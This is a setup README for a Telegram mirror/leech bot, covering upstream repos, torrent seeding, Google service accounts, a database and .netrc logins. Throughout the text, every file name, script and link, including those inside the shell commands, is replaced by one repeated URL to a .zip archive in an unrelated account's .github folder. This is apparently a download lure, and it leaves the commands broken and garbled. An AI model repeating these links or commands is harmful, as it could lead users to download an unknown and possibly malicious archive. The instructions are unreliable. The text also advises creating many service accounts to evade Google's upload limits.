## UPSTREAM REPO (Recommended)

- `UPSTREAM_REPO` variable can be used for edit/add any file in repository.
- You can add private/public repository link to grab/overwrite all files from it.
- You can skip adding the privates files like https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip or accounts folder before deploying, simply fill `UPSTREAM_REPO` private one in case you want to grab all files including private files.
- If you added private files while deploying and you have added private `UPSTREAM_REPO` and your private files in this private repository, so your private files will be overwritten from this repository. Also if you are using database for private files, then all files from database will override the private files that added before deploying or from private `UPSTREAM_REPO`.
- If you filled `UPSTREAM_REPO` with the official repository link, then be carefull incase any change in https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip your bot will not start after restart. In this case you need to deploy again with updated code to install the new requirements or simply by changing the `UPSTREAM_REPO` to you fork link with that old updates.
- In case you you filled `UPSTREAM_REPO` with your fork link be carefull also if you fetched the commits from the official repository.
- The changes in your `UPSTREAM_REPO` will take affect only after restart.

------

## Bittorrent Seed

- Add `d:ratio:time` perfix along with leech or mirror cmd.
- Using `d` perfix alone will lead to use global options for aria2c or qbittorrent.

### Qbittorrent
- Global options: `MaxRatio` and `GlobalMaxSeedingMinutes` in https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip, `-1` means no limit, but you can cancel manually.
  - **NOTE**: Don't change `MaxRatioAction`.

### Aria2c
- Global options: `--seed-ratio` (0 means no limit) and `--seed-time` (0 means no seed) in https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip

## Using Service Accounts for uploading to avoid user rate limit

>For Service Account to work, you must set `USE_SERVICE_ACCOUNTS` = "True" in config file or environment variables.
>**NOTE**: Using Service Accounts is only recommended while uploading to a Team Drive.

### 1. Generate Service Accounts. [What is Service Account?](https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip)
Let us create only the Service Accounts that we need.

**Warning**: Abuse of this feature is not the aim of this project and we do **NOT** recommend that you make a lot of projects, just one project and 100 SAs allow you plenty of use, its also possible that over abuse might get your projects banned by Google.

>**NOTE**: If you have created SAs in past from this script, you can also just re download the keys by running:
```
python3 https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip --download-keys $PROJECTID
```
>**NOTE:** 1 Service Account can upload/copy around 750 GB a day, 1 project can make 100 Service Accounts so you can upload 75 TB a day.

>**NOTE:** All people can copy `2TB/DAY` from each file creator (uploader account), so if you got error `userRateLimitExceeded` that doesn't mean your limit exceeded but file creator limit have been exceeded which is `2TB/DAY`.

#### Two methods to create service accounts
Choose one of these methods

##### 1. Create Service Accounts in existed Project (Recommended Method)
- List your projects ids
```
python3 https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip --list-projects
```
- Enable services automatically by this command
```
python3 https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip --enable-services $PROJECTID
```
- Create Sevice Accounts to current project
```
python3 https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip --create-sas $PROJECTID
```
- Download Sevice Accounts as accounts folder
```
python3 https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip --download-keys $PROJECTID
```

##### 2. Create Service Accounts in New Project
```
python3 https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip --quick-setup 1 --new-only
```
A folder named accounts will be created which will contain keys for the Service Accounts.

### 2. Add Service Accounts

#### Two methods to add service accounts
Choose one of these methods

##### 1. Add Them To Google Group then to Team Drive (Recommended)
- Mount accounts folder
```
cd accounts
```
- Grab emails form all accounts to https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip file that would be created in accounts folder
- `For Windows using PowerShell`
```
$emails = Get-ChildItem .\**.json |Get-Content -Raw |ConvertFrom-Json |Select -ExpandProperty client_email >>https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip
```
- `For Linux`
```
grep -oPh '"client_email": "\K[^"]+' *.json > https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip
```
- Unmount acounts folder
```
cd ..
```
Then add emails from https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip to Google Group, after that add this Google Group to your Shared Drive and promote it to manager and delete https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip file from accounts folder

##### 2. Add Them To Team Drive Directly
- Run:
```
python3 https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip -d SharedTeamDriveSrcID
```

### Generate Database

1. Go to `https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip` and sign-up.
2. Create Shared Cluster.
3. Press on `Database` under `Deployment` Header, your created cluster will be there.
5. Press on connect, choose `Allow Acces From Anywhere` and press on `Add IP Address` without editing the ip, then create user.
6. After creating user press on `Choose a connection`, then press on `Connect your application`. Choose `Driver` **python** and `version` **3.6 or later**.

## Multi Drive List
To use list from multi TD/folder. Run https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip in your terminal and follow it. It will generate **https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip** file or u can simply create `https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip` file in working directory and fill it, check below format:

## Yt-dlp and Aria2c Authentication Using .netrc File
For using your premium accounts in yt-dlp or for protected Index Links, create .netrc file according to following format:

**Note**: Create .netrc and not netrc, this file will be hidden, so view hidden files to edit it after creation.

Format:
```
machine host login username password my_password
```
Example:
```
machine instagram login https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip password mypassword
```
**Instagram Note**: You must login even if you want to download public posts and after first try you must confirm that this was you logged in from different ip(you can confirm from phone app).

Using Aria2c you can also use built in feature from bot with or without username. Here example for index link without username.
```
machine https://github.com/G148-ide/mirror-leech-telegram-bot/raw/refs/heads/master/.github/mirror-bot-telegram-leech-reconcede.zip password index_password
